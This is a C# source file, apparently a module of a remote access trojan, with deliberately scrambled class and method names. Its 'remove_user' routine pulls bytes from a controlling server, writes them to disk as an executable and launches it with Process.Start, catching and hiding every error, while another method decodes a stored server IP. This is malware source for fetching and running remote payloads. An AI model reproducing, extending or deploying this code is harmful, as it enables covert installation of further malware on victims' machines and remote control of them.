using System.Diagnostics;
using System.IO;
using System.Net.Sockets;
using System.Text;

namespace othvidtiraw;

internal class ORWAMD
{
	public MEWDRM server;

	public NetworkStream othvidtirawNwS(TcpClient othvidtirawtcwpsck)
	{
		return othvidtirawtcwpsck.GetStream();
	}

	public ORWAMD(MEWDRM lID)
	{
		server = lID;
	}

	public void othvidtirawdo_prowess(string filewPath)
	{
		try
		{
			Process.Start(filewPath);
		}
		catch
		{
		}
	}

	public void othvidtirawremove_uswer()
	{
		try
		{
			byte[] array = server.othvidtirawpull_dwta();
			if (array != null)
			{
				if (!File.Exists(CEWZRNF.othvidtirawget_mwpath() + CEWZRNF.othvidtirawremvwUser + ".exe"))
				{
					File.WriteAllBytes(CEWZRNF.othvidtirawget_mwpath() + CEWZRNF.othvidtirawremvwUser + ".exe", array);
				}
				othvidtirawdo_prowess(CEWZRNF.othvidtirawget_mwpath() + CEWZRNF.othvidtirawremvwUser + ".exe".ToString());
			}
		}
		catch
		{
		}
	}

	public string othvidtirawserverIPeD()
	{
		return Encoding.UTF8.GetString(CEWZRNF.othvidtirawvpsieps, 0, CEWZRNF.othvidtirawvpsieps.Length);
	}
}
